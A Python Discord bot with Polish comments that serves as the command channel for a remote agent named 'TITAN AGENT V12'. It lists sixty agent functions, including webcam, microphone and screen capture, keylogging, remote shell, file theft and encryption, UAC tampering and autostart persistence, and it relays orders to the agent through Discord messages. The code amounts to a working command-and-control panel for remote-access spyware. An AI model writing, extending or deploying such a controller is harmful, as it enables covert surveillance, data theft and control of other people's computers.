import discord
from discord import app_commands
from discord.ext import commands
import os

# Pobieranie tokenu z Environment Variables hostingu
TOKEN = os.getenv("DISCORD_TOKEN")

class HostingBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ Bot sterujący V12 Online (Token pobrany z hostingu)")

bot = HostingBot()

@bot.tree.command(name="krasnal_info", description="Lista 60 funkcji systemu")
async def krasnal_info(interaction: discord.Interaction):
    embed = discord.Embed(title="🛡️ TITAN AGENT V12 - KATALOG", color=0xFF0000)
    embed.add_field(name="👁️ Spy", value="`scr, cam, mic, clip, vid, keyon, keyoff, active, history, files`", inline=False)
    embed.add_field(name="⚙️ System", value="`info, procs, kill, shell, cpu, ram, bat, uptime, drv, serv`", inline=False)
    embed.add_field(name="🎭 Troll", value="`drunk, msg, hide, show, calc, eject, wp, beep, min, black`", inline=False)
    embed.add_field(name="🌐 Network", value="`ip, lip, wifi, ping, dns, ports, netstat, mac, hosts, web`", inline=False)
    embed.add_field(name="📂 Files", value="`ls, cd, get, put, rm, mkdir, enc, dec, find, size`", inline=False)
    embed.add_field(name="💀 Admin", value="`autoon, autooff, ps, taskadd, taskrm, uac, off, reboot, lock, kill_agent`", inline=False)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="cmd", description="Wydaj rozkaz Agentowi")
@app_commands.describe(akcja="Kod funkcji (np. scr, msg)", parametr="Tekst lub dane")
async def cmd(interaction: discord.Interaction, akcja: str, parametr: str = ""):
    # Wysyła wiadomość, którą przechwyci Agent na Twoim PC
    await interaction.response.send_message(f"🚀 ROZKAZ: `{akcja.lower()}` | Parametr: `{parametr}`")

bot.run(TOKEN)
